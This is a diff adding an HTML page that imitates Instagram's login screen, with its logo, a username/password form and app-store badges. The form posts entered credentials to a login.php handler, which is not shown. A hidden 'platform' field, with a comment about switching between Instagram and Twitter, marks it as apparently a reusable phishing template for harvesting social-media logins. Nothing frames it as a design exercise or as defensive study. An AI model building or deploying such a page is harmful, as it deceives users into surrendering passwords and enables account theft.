@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Clone</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+            <form action="login.php" method="POST">
+                <input type="hidden" name="platform" value="instagram"> <!-- Change to "instagram" or "twitter" as needed -->
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+                <div class="separator">
+                    <span>OR</span>
+                </div>
+                <a href="#" class="fb-login">Log in with Facebook</a>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        <div class="app-links">
+            <p>Get the app.</p>
+            <div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_badge_EN.svg" alt="App Store">
+            </div>
+        </div>
+    </div>
+</body>
+</html>
